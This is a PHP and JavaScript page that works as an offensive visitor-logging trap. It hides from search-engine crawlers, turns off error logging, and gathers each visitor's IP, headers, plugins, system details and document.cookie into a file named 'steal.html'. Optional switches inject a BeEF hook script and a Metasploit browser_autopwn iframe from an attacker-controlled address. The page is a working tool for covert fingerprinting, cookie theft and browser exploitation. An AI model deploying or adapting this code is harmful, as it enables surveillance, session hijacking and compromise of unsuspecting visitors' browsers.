<!DOCTYPE html>
<html>
<head>

<!-- PHP FUNCTIONS -->

<?php

 /* --------------------------------------------- */

  @ini_set('error_log', NULL);
  @ini_set('log_errors', 0);
  @ini_set('max_execution_time', 0);
  @set_time_limit(0);

  // Output
  define('output', 'steal.html');

  // Redirect
  define('redirect', 0); 
  define('redirect_url', 'http://test.com/');

  // Email notification
  define('email_notify', 0);
  define('notify_address', 'user@email.com');

  // Beef js hook (or custom js)
  define('use_beef', 0);
  define('hook_url', 'http://192.168.0.10:31337/hook.js');

  // Metasploit browser_autopwn http server (or custom iframe)
  define('use_autopwn', 0);
  define('autopwn_url', 'http://192.168.0.10:8080/woot');


/* --------------------------------------------- */

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

if(isset($_POST['data']) && file_exists(output) && is_writable(output)) {
  $fp = fopen(output, 'a');
  fwrite($fp, $_POST['data']);
  fclose($fp);
}

function notify() {

 $headers  = "MIME-Version: 1.0\n" ;
 $headers .= "Content-Type: text/html; charset=\"iso-8859-1\"\n";
 $headers .= "X-Priority: 1 (Highest)\n";
 $headers .= "X-MSMail-Priority: High\n";
 $headers .= "Importance: High\n";

  mail(notify_address, 'Sup?', 'IP logged - '.$_SERVER['REMOTE_ADDR'], $headers);

}

function nojs() {  

$ip   = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($ip);
if(!isset($_SERVER['HTTP_REFERER'])) { $ref = 'None'; } else { $ref = htmlspecialchars($_SERVER['HTTP_REFERER']); }
if(function_exists('getallheaders')) {
foreach(getallheaders() as $header => $info) {
  $req .= htmlspecialchars($header).' - '.htmlspecialchars($info).'<br />';
} 
} else { $req = 'Undefined'; }

$data = '<b>IP</b> - '.$ip.
'<br /><b>Host</b> - '.$host.
'<br /><b>Referer</b> - '.$ref.
'<br /><b>Time</b> - '.date("d.m.y / H:i:s").
'<br /><br /><b>Request headers</b>:<br /> '.$req;

$inx  = "<!DOCTYPE html><html><head><meta charset='UTF-8'></head><body><hr />";
$outx = "</body></html>";

if(file_exists(output) && is_writable(output)) {
  $fp = fopen(output, 'a');
  fwrite($fp, $inx.$data.$outx);
  fclose($fp);
}

if(redirect == 1) {
  header('Location: '.redirect_url);
}

}

if(isset($_GET['nojs'])) {
  nojs();
  exit;
}

?>

<!--JS FUNCTIONS -->

<script type="text/javascript">

function configVar() {
  var config = {
    host:"<?php echo 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];?>", 
    redirect:"<?php echo redirect; ?>",
    redirect_url:"<?php echo redirect_url; ?>",
  };
  return config;
}

function getUserData() {

  if(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection) { var rtcs = 'true'; } else { var rtcs = 'false'; }

  var userData = {
    ip:"<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>",
    ref:"<?php if(!isset($_SERVER['HTTP_REFERER'])) { echo 'None'; } else { echo htmlspecialchars($_SERVER['HTTP_REFERER']); } ?>",
    host:"<?php echo htmlspecialchars(gethostbyaddr($_SERVER['REMOTE_ADDR'])); ?>",
    accept:"<?php echo htmlspecialchars($_SERVER['HTTP_ACCEPT']); ?>",
    browser:navigator.appCodeName+" ("+navigator.appName+")",
    resolution:window.screen.availWidth+"x"+window.screen.availHeight,
    bresolution:window.outerWidth+"x"+window.outerHeight,
    colordepth:screen.colorDepth+" bit",
    browserver:navigator.appVersion,
    useragent:navigator.userAgent,
    os:navigator.platform,
    cookie:navigator.cookieEnabled,
    lang:navigator.language,
    build:navigator.buildID,
    rtc:rtcs,
  };
  return userData;
}

function getBrowserPlugins() {
var L = navigator.plugins.length;
var plugs = new Array();
for(var i = 0; i < L; i++) {
  plugs.push("<tr><td>" + navigator.plugins[i].name + "</td><td>" + navigator.plugins[i].filename + "</td><td>" + navigator.plugins[i].description + "</td><td>" + navigator.plugins[i].version + "</td></tr>");
}
return encodeURI("<br /><b>" + L.toString() + " Plugin(s) Detected</b><br><table border=1 width=80%><tr><td>Name</td><td>Filename</td><td>Description</td><td>Version</td></tr>" + plugs + "</table>");
}

function getPlugins() {
  if (navigator.plugins) {

    var quickt = false;
    var flash  = false;
    var silverlight = false;
    var javax = navigator.javaEnabled();

if (navigator.plugins["QuickTime"] )
{ quickt = true; }

try {
  var fo = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
  if (fo) {
    flash = true;
  }
} catch (e) {
  if (navigator.mimeTypes
        && navigator.mimeTypes['application/x-shockwave-flash'] != undefined
        && navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin) {
    flash = true;
  }
}

try
{
    var slControl = new ActiveXObject('AgControl.AgControl');
    silverlight = true;
}
catch (e)
{
if (navigator.plugins["Silverlight Plug-In"])
    {
  silverlight = true;
    }
}

var data = new Object();
    data['quicktime']   = quickt;
    data['flash']       = flash;
    data['silverlight'] = silverlight;
    data['java']        = javax;
return data;

}
 
}

function sendData(data) {
 var inx  = encodeURI("<!DOCTYPE html><html><head><meta charset='UTF-8'></head><body><hr />");
 var outx = encodeURI("</body></html>");
 var xhr  = new XMLHttpRequest();
 xhr.open("POST", config["host"], true);
 xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 xhr.withCredentials = true;
 var body = "data="+inx+data+getBrowserPlugins()+outx;
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
   aBody[i] = body.charCodeAt(i); 
 xhr.send(new Blob([aBody]));
}

</script>
</head>

<body>

<!-- MAIN -->

<script type="text/javascript">

var userData = getUserData();
var date = new Date();
var data = getPlugins();
var config = configVar();

var datax = encodeURI("<h3>Host</h3>"+
  "IP: "+userData["ip"]+"<br />"+
  "Hostname: "+userData["host"]+"<br />"+
  "Referer: "+userData["ref"]+"<br />"+
  "<h3>Browser</h3>"+
  "Browser: "+userData["browser"]+"<br />"+
  "Browser version: "+userData["browserver"]+"<br />"+
  "UserAgent: "+userData["useragent"]+"<br />"+
  "HTTP Accept: "+userData["accept"]+"<br />"+
  "Allow cookie: "+userData["cookie"]+"<br />"+
  "Browser language: "+userData["lang"]+"<br />"+
  "Build ID (YYYYMMDDHH): "+userData["build"]+"<br />"+
  "Cookies: "+document.cookie+
  "<h3>Computer</h3>"+
  "OS: "+userData["os"]+"<br />"+
  "Resolution: "+userData["resolution"]+"<br />"+
  "Browser size: "+userData["bresolution"]+"<br />"+
  "Color depth: "+userData["colordepth"]+"<br />"+
  "<h3>Time</h3>"+
  "User pc time: "+date.toLocaleString()+"<br />"+
  "Local time: "+date.toGMTString()+"<br />"+
  "<h3>Software</h3>"+
  "Java: "+data['java']+"<br />"+
  "Flash: "+data['flash']+"<br />"+
  "Silverlight: "+data['silverlight']+"<br />"+
  "QuickTime: "+data['quicktime']+"<br />"+
  "WebRTC: "+userData['rtc']+"<br />");

sendData(datax);

if(config["redirect"] == 1) {
    window.setTimeout(function(){
        window.location.href = config["redirect_url"];
    }, 1);
}

</script>

<?php

if(email_notify == 1) { notify(); }
if(use_beef == 1) { echo '<script src="'.hook_url.'"></script>'; }
if(use_autopwn == 1) { echo '<iframe src="'.autopwn_url.'"></iframe>'; }

?>

<noscript>
<meta http-equiv="refresh" content="0;url=?nojs"/>
</noscript>

</body>
</html>
